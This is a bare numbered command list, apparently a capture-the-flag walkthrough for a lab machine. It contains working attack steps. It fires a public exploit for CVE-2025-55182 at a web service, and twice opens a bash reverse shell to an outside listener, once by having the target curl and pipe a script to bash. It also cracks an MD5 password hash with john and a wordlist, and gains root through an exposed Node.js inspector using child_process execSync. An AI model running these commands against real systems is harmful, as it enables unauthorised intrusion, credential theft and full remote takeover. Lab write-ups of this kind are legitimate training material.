1. sudo nmap -Pn -sC -sV <IP>
2. Download CVE-2025-55182 Exploit DB
3. sudo python3 CVE-2025-55182.py -t http://10.129.101.31:3000 -c "id"
4. echo 'bash -i >& /dev/tcp/your-IP/9001 0>&1' > s.sh
5. python3 -m http.server 80
6. sudo nc -lvnp 9002
7. sudo python3 CVE-2025-55182.py -t http://10.129.101.31:3000 -c "curl http://10.10.15.47/s.sh|bash"

8. sqlite3 reactor.db
9. .tables
10. SELECT * FROM users;
11. echo '39d97110eafe2a9a68639812cd271e8e' > engineer_hash.txt
12. john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 engineer_hash.txt
13. su - engineer
    password: reactor1
14. cat user.txt
15. ss -tunlp
    127.0.0.1:9229
16. node inspect 127.0.0.1:9229
17. in your console - nc -nlvp 9002
18. in debug console: exec("process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.15.120/9002 0>&1\"').toString()")
19. cat root/root.txt
